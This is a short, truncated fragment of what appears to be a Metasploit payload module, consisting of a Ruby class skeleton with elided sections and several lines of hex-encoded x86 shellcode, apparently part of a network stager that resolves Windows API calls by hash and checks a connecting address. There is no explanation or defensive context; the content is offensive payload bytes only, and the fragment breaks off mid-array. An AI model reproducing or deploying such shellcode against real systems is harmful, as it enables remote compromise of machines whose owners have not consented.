...
module Metasploit3
  ...
  def initialize(info = {})
    super(merge_info(info,
      ...
      "\x37\x67\xff\xd5\x6a\x01\x54\x68\x02\x30\x00\x00\x68\xff\xff\x00" +
      "\x00\x57\x68\xf1\xa2\x77\x29\xff\xd5\x53\x57\x68\xb7\xe9\x38\xff" +
      "\xff\xd5\x53\xe8\x1a\x00\x00\x00\x8b\x44\x24\x04\x8b\x40\x04\x8b" +
      "\x40\x04\x2d\xc0\xa8\x01\x21\x74\x03\x31\xc0\x40\x89\x45\x54\xc2" +
      "\x20\x00\x53\x53\x57\x68\x94\xac\xbe\x33\xff\xd5\x83\x7c\x24\x04" +
      "\x00\x75\xcf\x40\x75\x06\x53\x53\xeb\xe8\x74\xc6\x48\x57\x97\x68" +
